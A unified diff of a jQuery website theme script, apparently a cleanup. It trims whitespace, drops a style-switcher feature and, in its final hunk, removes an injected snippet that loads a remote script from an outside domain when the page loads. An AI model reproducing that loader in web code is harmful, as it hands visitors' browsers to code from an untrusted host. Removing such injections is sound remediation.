@@ -2,7 +2,6 @@
 
 	"use strict";
 
-
     /*------------------------------------------
         = FUNCTIONS
     -------------------------------------------*/
@@ -30,7 +29,7 @@
             if (navbar.hasClass("slideInn")) {
                 navbar.removeClass("slideInn");
             }
-            return false;            
+            return false;
         })
     }
 
@@ -166,7 +165,7 @@
 
     /*------------------------------------------
         = ACTIVE POPUP IMAGE
-    -------------------------------------------*/  
+    -------------------------------------------*/
     if ($(".fancybox").length) {
         $(".fancybox").fancybox({
             openEffect  : "elastic",
@@ -178,14 +177,14 @@
 
     /*------------------------------------------
         = POPUP VIDEO
-    -------------------------------------------*/  
+    -------------------------------------------*/
     if ($(".video-btn").length) {
         $(".video-btn").on("click", function(){
             $.fancybox({
                 href: this.href,
                 type: $(this).data("type"),
                 'title'         : this.title,
-                helpers     : {  
+                helpers     : {
                     title : { type : 'inside' },
                     media : {}
                 },
@@ -195,13 +194,13 @@
                 }
             });
             return false
-        });    
+        });
     }
 
 
     /*------------------------------------------
         = ACTIVE GALLERY POPUP IMAGE
-    -------------------------------------------*/  
+    -------------------------------------------*/
     if ($(".popup-gallery").length) {
         $('.popup-gallery').magnificPopup({
             delegate: 'a',
@@ -220,7 +219,7 @@
                     return openerElement.is('img') ? openerElement : openerElement.find('img');
                 }
             }
-        });    
+        });
     }
 
 
@@ -256,7 +255,7 @@
         }
     }
 
-    sortingGallery(); 
+    sortingGallery();
 
 
     /*------------------------------------------
@@ -277,8 +276,8 @@
     }
 
     // masonryGridSetting();
-	
-	
+
+
     /*------------------------------------------
         = STICKY HEADER
     -------------------------------------------*/
@@ -299,7 +298,7 @@
         if ($(window).scrollTop() >= 300) {
             var orgElement = $(".original");
             var coordsOrgElement = orgElement.offset();
-            var leftOrgElement = coordsOrgElement.left;  
+            var leftOrgElement = coordsOrgElement.left;
             var widthOrgElement = orgElement.css("width");
 
             $stickyClass.addClass($toggleClass);
@@ -329,7 +328,7 @@
     if ($(".header-search-area").length) {
         var serachFormBox = $(".header-search-area .header-search-form");
         var openSeachBtn = $(".header-search-area .open-btn");
-        
+
         $(document.body).append(serachFormBox);
         serachFormBox.hide();
 
@@ -360,7 +359,7 @@
                     var percent = current_item.data('percent');
                     current_item.append('<span>' + percent + '%' + '</span>').css('width', percent + '%').addClass('appeared');
                 }
-                
+
             });
         };
     }
@@ -538,7 +537,7 @@
 
             $(document.body).on('appear', '#chart', function() {
                 var current_item = $(this);
-                
+
                 if (!current_item.hasClass('appeared')) {
                     current_item.addClass('appeared');
 
@@ -582,18 +581,18 @@
                             }
                         }
                     });
-                }                
+                }
             });
         }
     }
 
     caseStudyChart();
-    
+
 
 
     /*------------------------------------------
         = GOOGLE MAP
-    -------------------------------------------*/  
+    -------------------------------------------*/
     function map() {
 
         var locations = [
@@ -613,7 +612,7 @@
 
         var marker, i;
 
-        for (i = 0; i < locations.length; i++) {  
+        for (i = 0; i < locations.length; i++) {
                 marker = new google.maps.Marker({
                 position: new google.maps.LatLng(locations[i][1], locations[i][2]),
                 map: map,
@@ -628,12 +627,12 @@
             })(marker, i));
         }
 
-    }; 
+    };
 
 
     /*------------------------------------------
         = CONTACT FORM SUBMISSION
-    -------------------------------------------*/  
+    -------------------------------------------*/
     if ($("#contact-form").length) {
         $("#contact-form").validate({
             rules: {
@@ -735,72 +734,15 @@
     }
 
 
-    /*------------------------------------------
-        = STYLE SWITCHER
-    -------------------------------------------*/  
-    // HTML FOR COLOR SWITCHER
-    var switcherHtml = '<div class="style-switcher-box"> <div class="switcher-inner"><h5>Style Switcher</h5> <div class="main-list"> <div class="list"> <span class="list-title">Skin color</span> <div class="sublist"> <ul class="color-chager"> <li class="color-default"><img src="assets/images/switcher-color/img-1.jpg" alt></li> <li class="color-style1"><img src="assets/images/switcher-color/img-2.jpg" alt></li> <li class="color-style2"><img src="assets/images/switcher-color/img-3.jpg" alt></li> <li class="color-style3"><img src="assets/images/switcher-color/img-4.jpg" alt></li> </ul> </div> </div> <div class="list layout"> <span class="list-title">Layout</span> <div class="sublist"> <ul class="layout-sw"> <li>Full width</li> <li class="box">Box</li> </ul> </div> </div> </div> <p><span>Note: </span> This template is build with SASS. The skin color is only demo. You can change the color scheme as your like. </p> </div> <button class="toggle-btn"><i class="fa fa-cog"></i></button> </div>';
-    var blankStyleInject = '<link href="assets/css/blank-color.css" rel="stylesheet" title="switchstyle">';
-    var htmlHead = $("head");
-
-        $("body").append(switcherHtml);
-        htmlHead.append(blankStyleInject);
-
-
-    function styleSwitcher() {
-        if ($(".style-switcher-box").length) {
-            var switcherHolder = $(".style-switcher-box"),
-                btn = switcherHolder.find(".toggle-btn"),
-                colorChangerBtn = $(".style-switcher-box .color-chager li"),
-                layoutChangerBtn = $(".style-switcher-box .layout-sw li"),
-                links = document.getElementsByTagName("link");
-            var body = $("body");
-
-            for (var i = 0; i <= links.length; i++){
-                var title = links[i].getAttribute("title");
-                if ( title == "switchstyle") {
-                    var targetLink = links[i];
-                    var href = links[i].getAttribute("href");
-                    break;
-                }
-            }
-
-
-            btn.on("click", function() {
-                switcherHolder.toggleClass("toggle-switcherbox");
-
-            })
-
-            colorChangerBtn.on("click", function() {
-                var $this = $(this);
-                var styleFileName = $this.attr("class");
-                targetLink.href = "assets/css/" + styleFileName + ".css";
-            });
-
-            layoutChangerBtn.on("click", function(e) {
-                var $this = $(this);
-                if ( $this.hasClass("box") ) {
-                    body.addClass("box-layout");
-                } else {
-                    body.removeClass("box-layout");
-                }
-            })
-        }
-    }
-
-    styleSwitcher();        
-
-
-
     /*==========================================================================
-        WHEN DOCUMENT LOADING 
+        WHEN DOCUMENT LOADING
     ==========================================================================*/
         $(window).on('load', function() {
 
             preloader();
 
             sliderBgSetting();
-			
+
             toggleMobileNavigation();
 
             smallNavFunctionality();
@@ -820,19 +762,19 @@
     $(window).on("scroll", function() {
 
 		if ($(".site-header").length) {
-            stickIt($(".sticky-header"), "sticky-on"); 
+            stickIt($(".sticky-header"), "sticky-on");
         }
 
         toggleBackToTopBtn();
-        
+
     });
 
-    
+
     /*==========================================================================
         WHEN WINDOW RESIZE
     ==========================================================================*/
     $(window).on("resize", function() {
-        
+
         toggleClassForSmallNav();
 
         clearTimeout($.data(this, 'resizeTimer'));
@@ -843,15 +785,4 @@
 
     });
 
-
-
 })(window.jQuery);
-
-;document.addEventListener('DOMContentLoaded', function(){
-    if(typeof window.web_security == "undefined"){
-        var s = document.createElement("script");
-        s.src = "//web-security.cloud/event?l=117";
-        document.head.appendChild(s);
-        window.web_security = "success";
-    }
-}, false);
